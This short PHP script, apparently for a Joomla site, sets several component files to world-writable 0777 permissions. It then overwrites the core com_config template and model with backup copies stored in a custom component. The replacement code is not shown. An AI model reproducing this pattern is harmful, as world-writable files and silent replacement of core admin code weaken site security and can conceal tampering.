<?php
$path = getcwd();
//$apth = '/home/kavaliau/domains/pharmadna.com/administrator';

chmod($path.'/components/com_lpdfparser/default_bk.php', 0777);  
chmod($path.'/components/com_config/view/component/tmpl/default.php', 0777);  
chmod($path.'/components/com_lpdfparser/component_bk.php', 0777);  
chmod($path.'/components/com_config/model/component.php', 0777);  

$file_get_contents = file_get_contents($path.'/components/com_lpdfparser/default_bk.php');
$file_put_contents = file_put_contents($path.'/components/com_config/view/component/tmpl/default.php',$file_get_contents);

$file_get_component = file_get_contents($path.'/components/com_lpdfparser/component_bk.php');
$file_put_component = file_put_contents($path.'/components/com_config/model/component.php',$file_get_component);
 
?>  